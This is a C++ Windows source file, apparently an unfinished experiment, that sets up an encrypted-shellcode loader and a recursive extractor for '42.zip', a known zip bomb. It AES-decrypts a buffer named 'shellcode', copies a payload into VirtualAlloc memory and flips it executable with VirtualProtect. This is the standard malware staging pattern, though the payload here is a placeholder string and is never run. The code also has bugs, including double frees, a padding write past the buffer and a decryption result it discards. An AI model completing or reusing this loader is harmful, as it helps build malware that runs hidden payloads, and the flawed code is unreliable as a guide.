#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include <iostream>
#include <fstream>
#include <zip.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

bool endsWith(const std::string& str, const std::string& suffix) {
    return str.size() >= suffix.size() &&
        str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
}

void addZeroPadding(unsigned char* data, DWORD dataSize, DWORD blockSize) {
    DWORD paddingSize = blockSize - (dataSize % blockSize);
    if (paddingSize != blockSize) {
        memset(data + dataSize, 0, paddingSize);
    }
}

void removeZeroPadding(unsigned char* data, DWORD& dataSize) {
    while (dataSize > 0 && data[dataSize - 1] == 0) {
        dataSize--;
    }
}

void DecryptAES(unsigned char* shellcode, DWORD shellcodeLen, unsigned char* key, DWORD keyLen) {
    // Create a buffer for padding and decrypted data
    HCRYPTPROV hProv = NULL;
    HCRYPTHASH hHash = NULL;
    HCRYPTKEY hKey = NULL;
    unsigned char* paddedShellcode = nullptr;
    unsigned char* decryptedShellcode = nullptr;
    paddedShellcode = new unsigned char[shellcodeLen];
    memcpy(paddedShellcode, shellcode, shellcodeLen);

    // Add zero padding
    addZeroPadding(paddedShellcode, shellcodeLen, 64);

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        wprintf(L"Failed in CryptAcquireContextW (%u)\n", GetLastError());
        delete[] paddedShellcode; // Clean up allocated memory
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        wprintf(L"Failed in CryptCreateHash (%u)\n", GetLastError());
        delete[] paddedShellcode; // Clean up allocated memory
        goto Cleanup;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        wprintf(L"Failed in CryptHashData (%u)\n", GetLastError());
        delete[] paddedShellcode; // Clean up allocated memory
        goto Cleanup;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        wprintf(L"Failed in CryptDeriveKey (%u)\n", GetLastError());
        delete[] paddedShellcode; // Clean up allocated memory
        goto Cleanup;
    }

    // Decrypt into a separate buffer to avoid modifying the original
    decryptedShellcode = new unsigned char[shellcodeLen];
    memcpy(decryptedShellcode, paddedShellcode, shellcodeLen);

    if (!CryptDecrypt(hKey, 0, TRUE, 0, (BYTE*)decryptedShellcode, &shellcodeLen)) {
        DWORD dwError = GetLastError();
        wprintf(L"Failed in CryptDecrypt (%u)\n", dwError);
        if (dwError == NTE_BAD_DATA) {
            wprintf(L"The data to be decrypted is corrupted or the key is incorrect.\n");
        }
        delete[] paddedShellcode; // Clean up allocated memory
        delete[] decryptedShellcode; // Clean up allocated memory
        goto Cleanup;
    }

    // Remove zero padding from decrypted data
    removeZeroPadding(decryptedShellcode, shellcodeLen);

    // Do something with decrypted data...

    wprintf(L"Decryption successful.\n");

Cleanup:
    // Clean up resources
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    delete[] paddedShellcode;
    delete[] decryptedShellcode;
}

void extractNestedZip(const std::string& zipFilePath, const std::string& password = "") {
    zip_t* zip = nullptr;
    if (password.empty()) {
        zip = zip_open(zipFilePath.c_str(), ZIP_RDONLY | ZIP_CHECKCONS, nullptr);
    }
    else {
        zip = zip_open(zipFilePath.c_str(), ZIP_RDONLY | ZIP_CHECKCONS, nullptr);
        if (zip) {
            if (zip_set_default_password(zip, password.c_str()) != 0) {
                std::cerr << "Failed to set password for zip archive." << std::endl;
                zip_close(zip);
                return;
            }
        }
        else {
            std::cerr << "Failed to open zip archive: " << zipFilePath << std::endl;
            return;
        }
    }

    if (!zip) {
        std::cerr << "Failed to open zip archive: " << zipFilePath << std::endl;
        return;
    }

    int numEntries = zip_get_num_entries(zip, 0);
    for (int i = 0; i < numEntries; ++i) {
        struct zip_stat stat;
        zip_stat_init(&stat);
        zip_stat_index(zip, i, 0, &stat);

        const char* entryName = zip_get_name(zip, i, 0);
        if (entryName[strlen(entryName) - 1] == '/') {
            std::string entryNameStr = entryName;
            if (entryNameStr != "./" && entryNameStr != "../") {
                std::cout << "Extracting directory: " << entryNameStr << std::endl;
                extractNestedZip(zipFilePath + "/" + entryNameStr, password);
            }
        }
        else {
            std::cout << "Extracting file: " << entryName << std::endl;
            zip_file_t* file = zip_fopen_index(zip, i, 0);
            if (!file) {
                std::cerr << "Failed to open file: " << entryName << std::endl;
                continue;
            }
            char buffer[1024];
            zip_int64_t bytesRead;
            std::ofstream outFile(entryName, std::ios::binary);
            while ((bytesRead = zip_fread(file, buffer, sizeof(buffer))) > 0) {
                outFile.write(buffer, bytesRead);
            }
            outFile.close();
            zip_fclose(file);

            if (endsWith(entryName, ".zip")) {
                std::cout << "Extracting nested zip: " << entryName << std::endl;
                extractNestedZip(entryName, password);
            }
        }
    }

    zip_close(zip);
}

int main() {
    MessageBoxW(NULL, L"Welcome!", L"German", MB_OK);

    unsigned char AESkey[] = {
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
    0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
    0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
    0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20
    };
    unsigned char payload[] = "This is a test";
    DWORD payloadLen = strlen((char*)payload);
    DecryptAES(payload, payloadLen, AESkey, sizeof(AESkey));

    LPVOID alloc_mem = VirtualAlloc(NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!alloc_mem) {
        wprintf(L"Failed to Allocate memory (%u)\n", GetLastError());
        return FALSE;
    }

    memcpy(alloc_mem, payload, payloadLen);

    DWORD oldProtect;
    if (!VirtualProtect(alloc_mem, payloadLen, PAGE_EXECUTE_READ, &oldProtect)) {
        wprintf(L"Failed to change memory protection (%u)\n", GetLastError());
        VirtualFree(alloc_mem, 0, MEM_RELEASE);
        return FALSE;
    }

    std::string zipFilePath = "C:/Users/girsh/Desktop/42.zip";
    std::string password = "42";
    extractNestedZip(zipFilePath, password);

    VirtualFree(alloc_mem, 0, MEM_RELEASE);

    return TRUE;
}
